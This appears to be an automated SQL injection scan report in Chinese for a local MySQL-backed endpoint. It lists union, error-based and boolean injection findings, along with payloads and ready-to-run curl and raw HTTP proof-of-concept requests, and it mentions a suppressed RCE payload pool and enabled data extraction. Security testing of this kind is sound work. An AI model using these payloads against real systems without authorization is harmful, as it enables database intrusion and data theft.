# SQL 注入检测报告

- 扫描ID：`GwSvk25mr9Tz`
- 目标：`http://127.0.0.1:8181/like?q=Keyboard`
- 风险等级：**Critical**
- 数据库：MySQL
- 注入点：1 · 漏洞：3

## 本次命中与抑制项

- 本次已检出 **3** 条漏洞（详见下方清单）；verdict 仅用于描述「未检出」类阴性结论的可信度，不适用于本次结果。
> 本次扫描检出 3 条漏洞；verdict 仅描述「未检出」类阴性结论的可信度，命中详情见 vulns

- 本次被抑制的能力（不代表已测试）：
  - 高危 payload 池（写文件/RCE/重运算类，本配置下候选 1 条）已抑制：productionMode=true 且未 confirmDestructive=true。确需在已授权目标上投放时显式设 confirmDestructive=true；靶场/演练环境可整体关护栏（productionMode=false）
  - 本次开启拖库（enableExtract）：提取阶段会向目标发出大量读请求（受限速与行数上限约束）。生产环境建议控制行数并避开业务高峰

## 漏洞清单

| 注入点 | 技术 | 数据库 | 风险 | 说明 |
|---|---|---|---|---|
| dec9ec92 | union | MySQL | High | UNION 注入成功，回显列：0,1,2,3（列数 4） |
| dec9ec92 | error | MySQL | High | 数据库报错回显：syntax error（识别为 MySQL） |
| dec9ec92 | boolean | MySQL | Medium | 布尔注入确认(统计·自适应): 真≈基线1.00、假≠基线1.00、差异1.00、基线噪声0.00、门槛0.66、z=2.83(显著) |

## Payload 示例

- `Keyboard' UNION SELECT 'SQLISCANNER0','SQLISCANNER1','SQLISCANNER2','SQLISCANNER3'-- -`
- `Keyboard' ORDER BY 4-- -`
- `Keyboard' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`
- `Keyboard' AND 1=1-- -`
- `Keyboard' AND 1=2-- -`

## 复现方式（PoC）

以下请求由引擎实际发送形态还原（含 prefix/suffix 与会话上下文），可直接回放验证“这不是误报”。

### PoC-1 · 注入点 dec9ec92 · union

- 请求：`GET http://127.0.0.1:8181/like?q=Keyboard%27+UNION+SELECT+%27SQLISCANNER0%27%2C%27SQLISCANNER1%27%2C%27SQLISCANNER2%27%2C%27SQLISCANNER3%27--+-`
- Payload：`Keyboard' UNION SELECT 'SQLISCANNER0','SQLISCANNER1','SQLISCANNER2','SQLISCANNER3'-- -`
- 说明：由引擎 buildInjectionRequest 还原，与扫描时实际请求同构
- 生成时间：2026-09-11T18:28:41.619Z

curl（复制即跑）：

```bash
curl -i -s -k 'http://127.0.0.1:8181/like?q=Keyboard%27+UNION+SELECT+%27SQLISCANNER0%27%2C%27SQLISCANNER1%27%2C%27SQLISCANNER2%27%2C%27SQLISCANNER3%27--+-'
```

原始报文（存为 `poc-1-dec9ec92.txt` 后可用 -r 导入复现）：

```http
GET /like?q=Keyboard%27+UNION+SELECT+%27SQLISCANNER0%27%2C%27SQLISCANNER1%27%2C%27SQLISCANNER2%27%2C%27SQLISCANNER3%27--+- HTTP/1.1
Host: 127.0.0.1:8181


```

### PoC-2 · 注入点 dec9ec92 · error

- 请求：`GET http://127.0.0.1:8181/like?q=Keyboard%27+AND+extractvalue%281%2Cconcat%280x7e%2C%28SELECT+version%28%29%29%29%29--+-`
- Payload：`Keyboard' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`
- 说明：由引擎 buildInjectionRequest 还原，与扫描时实际请求同构
- 生成时间：2026-09-11T18:28:41.620Z

curl（复制即跑）：

```bash
curl -i -s -k 'http://127.0.0.1:8181/like?q=Keyboard%27+AND+extractvalue%281%2Cconcat%280x7e%2C%28SELECT+version%28%29%29%29%29--+-'
```

原始报文（存为 `poc-2-dec9ec92.txt` 后可用 -r 导入复现）：

```http
GET /like?q=Keyboard%27+AND+extractvalue%281%2Cconcat%280x7e%2C%28SELECT+version%28%29%29%29%29--+- HTTP/1.1
Host: 127.0.0.1:8181


```

### PoC-3 · 注入点 dec9ec92 · boolean

- 请求：`GET http://127.0.0.1:8181/like?q=Keyboard%27+AND+1%3D1--+-`
- Payload：`Keyboard' AND 1=1-- -`
- 说明：由引擎 buildInjectionRequest 还原，与扫描时实际请求同构
- 生成时间：2026-09-11T18:28:41.620Z

curl（复制即跑）：

```bash
curl -i -s -k 'http://127.0.0.1:8181/like?q=Keyboard%27+AND+1%3D1--+-'
```

原始报文（存为 `poc-3-dec9ec92.txt` 后可用 -r 导入复现）：

```http
GET /like?q=Keyboard%27+AND+1%3D1--+- HTTP/1.1
Host: 127.0.0.1:8181


```
